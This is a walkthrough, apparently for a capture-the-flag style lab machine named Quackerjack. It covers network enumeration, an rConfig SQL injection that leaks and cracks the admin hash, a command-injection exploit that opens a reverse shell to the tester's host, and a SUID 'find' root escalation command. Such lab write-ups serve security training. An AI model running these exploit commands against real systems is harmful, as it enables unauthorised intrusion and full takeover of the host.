---
icon: ubuntu
---

# Quackerjack - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.224.57 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-04 11:32 EDT
Nmap scan report for 192.168.224.57
Host is up (0.029s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.45.158
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 a2:ec:75:8d:86:9b:a3:0b:d3:b6:2f:64:04:f9:fd:25 (RSA)                                                                                      
|   256 b6:d2:fd:bb:08:9a:35:02:7b:33:e3:72:5d:dc:64:82 (ECDSA)                                                                                     
|_  256 08:95:d6:60:52:17:3d:03:e4:7d:90:fd:b2:ed:44:86 (ED25519)                                                                                   
80/tcp   open  http        Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)                                                             
|_http-title: Apache HTTP Server Test Page powered by CentOS                                                                                        
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16                                                                          
| http-methods:                                                                                                                                     
|_  Potentially risky methods: TRACE                                                                                                                
111/tcp  open  rpcbind     2-4 (RPC #100000)                                                                                                        
| rpcinfo:                                                                                                                                          
|   program version    port/proto  service                                                                                                          
|   100000  2,3,4        111/tcp   rpcbind                                                                                                          
|   100000  2,3,4        111/udp   rpcbind                                                                                                          
|   100000  3,4          111/tcp6  rpcbind                                                                                                          
|_  100000  3,4          111/udp6  rpcbind                                                                                                          
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)                                                                                  
445/tcp  open  netbios-ssn Samba smbd 4.10.4 (workgroup: SAMBA)                                                                                     
3306/tcp open  mysql       MariaDB 10.3.23 or earlier (unauthorized)                                                                                
8081/tcp open  http        Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)                                                             
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16                                                                          
|_http-title: 400 Bad Request                                                                                                                       
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                               
Device type: general purpose|router                                                                                                                 
Running (JUST GUESSING): Linux 3.X|4.X|2.6.X|5.X (97%), MikroTik RouterOS 7.X (90%)                                                                 
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3                                                                                                                    
Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.2 - 4.14 (97%), Linux 3.13 - 4.4 (91%), Linux 3.8 - 3.16 (91%), Linux 2.6.32 - 3.13 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 - 5.19 (91%), Linux 5.0 - 5.14 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.15 (90%)                                 
No exact OS matches for host (test conditions non-ideal).                                                                                           
Network Distance: 4 hops                                                                                                                            
Service Info: Host: QUACKERJACK; OS: Unix                                                                                                           
                                                                                                                                                    
Host script results:                                                                                                                                
| smb-os-discovery:                                                                                                                                 
|   OS: Windows 6.1 (Samba 4.10.4)                                                                                                                  
|   Computer name: quackerjack                                                                                                                      
|   NetBIOS computer name: QUACKERJACK\x00                                                                                                          
|   Domain name: \x00                                                                                                                               
|   FQDN: quackerjack                                                                                                                               
|_  System time: 2025-10-04T11:34:40-04:00                                                                                                          
| smb2-time:                                                                                                                                        
|   date: 2025-10-04T15:34:39
|_  start_date: N/A
|_clock-skew: mean: 1h20m00s, deviation: 2h18m35s, median: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   30.70 ms 192.168.45.1
2   28.85 ms 192.168.45.254
3   30.77 ms 192.168.251.1
4   31.34 ms 192.168.224.57
```

FTP, SMB & RPC none of them gave me anything to work with

### <mark style="color:$primary;">FTP Enumeration</mark>

<figure><img src="../../.gitbook/assets/image (743).png" alt=""><figcaption></figcaption></figure>

In FTP we cannot ls or put anythin

### <mark style="color:$primary;">SMB Enumeration</mark>

```
netexec smb 192.168.224.57 -u '' -p '' --shares
```

<figure><img src="../../.gitbook/assets/image (744).png" alt=""><figcaption></figcaption></figure>

on SMB we can only list 2 share

### <mark style="color:$primary;">RPC Enumeration</mark>

```
rpcinfo -p 192.168.224.57
```

<figure><img src="../../.gitbook/assets/image (745).png" alt=""><figcaption></figcaption></figure>

Rpc also has nothing interesting, no nfs's we can connect to

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (746).png" alt=""><figcaption></figcaption></figure>

Just a default page

### <mark style="color:$primary;">HTTP Port 8081 TCP</mark>

<figure><img src="../../.gitbook/assets/image (747).png" alt=""><figcaption></figcaption></figure>

I am going to checkout the ssl certificate in firefox since it give us more details

<figure><img src="../../.gitbook/assets/image (748).png" alt=""><figcaption></figcaption></figure>

quackerjack might be a user and a confirmation of the DNS. Let's add quackerjack to the /etc/hosts file.

```
192.168.224.57 	quackerjack
```

<figure><img src="../../.gitbook/assets/image (749).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (750).png" alt=""><figcaption></figcaption></figure>

The site provides us with a version. Also default creds do not work

<figure><img src="../../.gitbook/assets/image (751).png" alt=""><figcaption></figcaption></figure>

I am going to try the SQLI exploit

### <mark style="color:$primary;">Rconfig 3.9 'searchcolumn' SQLI</mark>

```
searchsploit -m 48208
```

<figure><img src="../../.gitbook/assets/image (752).png" alt=""><figcaption></figcaption></figure>

The SQLI exploit extracts the admin user's hash let's see if it works

```
python 48208.py https://192.168.224.57:8081
```

<figure><img src="../../.gitbook/assets/image (753).png" alt=""><figcaption></figcaption></figure>

When running the exploit we get this error

A quick google search reveals the solution so we updated the

<figure><img src="../../.gitbook/assets/image (754).png" alt=""><figcaption></figcaption></figure>

So we updated our code by adding <mark style="color:$success;">**verify=False**</mark>

<figure><img src="../../.gitbook/assets/image (755).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (757).png" alt=""><figcaption></figcaption></figure>

And now it works!

```
python 48208.py https://192.168.224.57:8081
```

<figure><img src="../../.gitbook/assets/image (758).png" alt=""><figcaption></figcaption></figure>

We got the admin user's hash and [**crackstation**](https://crackstation.net/) cracked it for us!

<figure><img src="../../.gitbook/assets/image (759).png" alt=""><figcaption></figcaption></figure>

```
admin:abgrtyu
```

Logging it with the creds redirects us to this page

<figure><img src="../../.gitbook/assets/image (760).png" alt=""><figcaption></figcaption></figure>

Now let's try this rce exploit we found earlier on searchsploit

### <mark style="color:$primary;">rConfig 3.9.4 'search.crud.php' Remote Command Injection</mark>

```
searchsploit -m 48241
```

```
python 48241.py https://192.168.224.57:8081 admin abgrtyu 192.168.45.158 80
```

<figure><img src="../../.gitbook/assets/image (761).png" alt=""><figcaption></figcaption></figure>

And we got a shell as apache!

## <mark style="color:blue;">Privilege Escalation</mark>

### <mark style="color:$primary;">Linpeas</mark>

<figure><img src="../../.gitbook/assets/image (762).png" alt=""><figcaption></figcaption></figure>

Linpeas reveals the find SUID, [**GTFObins**](https://gtfobins.github.io/gtfobins/find/#suid) has an easy privesc solution

### <mark style="color:$primary;">SUID FIND</mark>

<figure><img src="../../.gitbook/assets/image (763).png" alt=""><figcaption></figcaption></figure>

```
/usr/bin/find . -exec /bin/bash -p \; -quit
```

<figure><img src="../../.gitbook/assets/image (764).png" alt=""><figcaption></figcaption></figure>

Now we are root!
